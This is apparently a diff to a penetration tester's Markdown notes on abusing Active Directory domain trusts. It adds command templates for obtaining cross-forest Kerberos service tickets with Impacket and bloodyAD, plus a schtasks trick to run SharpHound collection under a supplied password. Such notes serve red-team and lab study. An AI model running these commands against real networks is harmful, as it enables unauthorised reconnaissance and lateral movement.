@@ -140,6 +140,22 @@ Enter-PSSession {PSSession_ID_returned}
 
 **Abusing Domain Trusts**
 - Remember here that since we're using kerberos we have to use DNS instead of IPs
+- Getting cross-forest service tickets
+  - Normally, this isn't as necessary, as domains trusting each other should allow our existing TGT to talk to both
+    - However, some tools like `bloodyAD` and Impacket don't handle inter-realm tickets, so we need to do the work and use the referral ticket for them to get a service ticket
+  - Step 0: Have a working TGT for the primary domain
+  - Step 1: Request inter-realm TGT from our KDC
+    - `getST.py -spn 'krbtgt/{target_domain}' -dc-ip {our_dc_ip} -k -no-pass '{primary_domain}/{user}'`
+    - Then export that ticket into KRB5CCNAME
+  - Step 2: Use the referral TGT to request a service ticket from the target KDC
+    - `getST.py -spn 'host/{target_dc_fqdn}' -dc-ip {target_dc_ip} -k -no-pass '{target_domain}/{user}'`
+  - Step 3: Use it!
+    - `bloodyAD --host {target_dc_fqdn} -d {target_domain} -k get search --filter '{LDAP_filter}'`
+- Dumping across domains
+  - If we need to, we can use `schtasks` to create a fresh TGT for sharphound to consume
+    - `schtasks /create /tn "BHCollect" /tr "C:\ProgramData\sh\SharpHound.exe -d {primary_domain} -c All --outputdirectory C:\ProgramData\sh --domaincontroller {target_domain}" /sc once /st 00:00 /ru "{primary_domain}\{user}" /rp "{password}" /f`
+    - `schtasks /run /tn "BHCollect"`
+  - The usual tools fail due to the referral TGT, which none of them can handle I guess??
 - Getting SIDs
 	- Domain SIDs are often needed for tickets, so we use impacket's `lookupsid.py`
 		- `lookupsid.py -domain-sids {domain_user_domain}/{domain_user}:{password}@{target_dc_IP} 0`
